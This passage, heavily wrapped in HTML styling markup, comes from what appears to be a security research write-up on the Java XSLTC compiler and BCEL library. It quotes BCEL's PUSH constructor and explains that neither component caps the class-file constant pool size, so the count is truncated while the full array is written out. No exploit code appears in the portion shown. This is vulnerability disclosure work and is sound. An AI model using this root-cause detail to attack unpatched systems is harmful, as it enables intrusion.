pre-wrap;">InstructionList</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> il </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> methodGen</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">getInstructionList</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">();</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;il</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">append</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">new</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> PUSH</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cpg</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> _value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">));</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">// org/apache/bcel/internal/generic/PUSH.java</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">public</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> PUSH</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">final</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ConstantPoolGen</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> cp</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">final</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">int</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">((</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">value </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">-</span><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;&amp;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">value </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">5</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">))</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;instruction </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">InstructionConst</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">getInstruction</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Const</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ICONST_0 </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">+</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">else</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Instruction</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">isValidByte</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">))</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;instruction </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">new</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> BIPUSH</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">((</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">byte</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">else</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Instruction</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">isValidShort</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">))</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;instruction </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">new</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> SIPUSH</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">((</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">short</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">else</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;instruction </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">new</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> LDC</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cp</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">addInteger</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">));</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The problem with this approach is that neither XSLTC nor BCEL correctly limits the size of the constant pool. As </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">constant_pool_count</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, which describes the size of the constant pool, is only 2 bytes long, its maximum size is limited to 2**16 - 1 or 65535 entries. In practice even fewer entries are possible, because some constant types take up two entries. However, BCELs internal constant pool representation uses a standard Java Array for storing constants, and does not enforce any limits on its length.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">When XSLTC processes a stylesheet that contains more constants, and BCELs internal class representation is serialized to a class file at the end of the compilation process the array length is truncated to a short, but the complete array is written out:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span 